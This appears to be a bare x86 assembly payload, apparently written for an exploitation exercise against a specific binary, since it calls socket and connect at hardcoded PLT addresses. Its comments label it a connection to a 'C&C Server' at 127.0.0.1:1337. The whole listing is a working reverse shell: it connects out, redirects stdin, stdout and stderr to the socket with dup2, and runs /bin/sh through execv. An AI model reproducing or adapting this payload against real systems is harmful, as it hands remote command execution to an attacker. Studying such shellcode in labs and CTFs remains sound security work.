# Connect to C&C Server on localhost aka 127.0.0.1 and on port 1337
#mov ebp, esp
sub esp, 40
push   0
push   1
push   2
mov edx, 0x8048730 
call   edx # <socket@plt>
add    esp, 0x10
mov ebx, eax
#mov    DWORD PTR [ebp-0xc],eax
push 0x100007f
push 0x3905
push 0x2
mov ecx, esp
#mov    WORD PTR [ebp-0x1c],0x2
#mov    DWORD PTR [ebp-0x18],0x100007f
#mov    WORD PTR [ebp-0x1a],0x3905
sub    esp,0x4
push   0x10
#lea    eax,[ebp-0x1c]
#push   eax
push ecx
push   ebx
mov edx, 0x08048750 
call   edx # <connect@plt>
add    esp,0x10
# Redirect STDIN to the socket
sub    esp,0x8
push   0x0
push   ebx
mov edx, 0x08048600
call   edx # <dup2@plt>
add    esp,0x10
# Redirect STDOUT to the socket
sub    esp,0x8
push   0x1
push   ebx
mov edx, 0x08048600
call   edx # <dup2@plt>
add    esp,0x10
# Redirect STDERR to the socket
sub    esp,0x8
push   0x2
push   ebx
mov edx, 0x08048600 
call   edx # <dup2@plt>
add    esp,0x10
# Execute /bin/sh
call execute_bin_sh
get_bin_sh:
.STRING "/bin/sh"
execute_bin_sh:
pop edx
push 0
push edx
mov edx, 0x080486d0
call   edx # <execv@plt>
